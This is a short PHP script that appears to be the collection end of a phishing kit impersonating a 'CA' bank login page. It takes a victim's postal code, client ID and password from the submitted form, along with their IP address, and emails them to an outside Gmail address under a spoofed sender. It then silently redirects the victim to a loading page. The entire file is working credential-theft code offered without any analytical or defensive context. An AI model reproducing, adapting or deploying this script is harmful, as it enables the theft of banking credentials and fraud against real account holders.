
<?
$ip = $_SERVER['REMOTE_ADDR'];
$message .= "============================================================\n";
$message .= "------------------+ CA Login +------------------------\n";
$message .= "============================================================\n";
$message .= "Cp           : ".$_POST['zip']."\n";
$message .= "Id           : ".$_POST['CCPTE']."\n";
$message .= "Mdp          : ".$_POST['CCCRYC']."\n";
$message .= "============================================================\n";
$message .= "------------------+ login by client +----------------\n";
$message .= "============================================================\n";
$send="rajla8080@gmail.com";
$subject = "Login Jaa | $ip | $date";
$headers = "From: Mr.Login <don@mox.fr>";

mail($send,$subject,$message,$headers);

?><meta http-equiv="Refresh" content="0; URL=loading1.html">





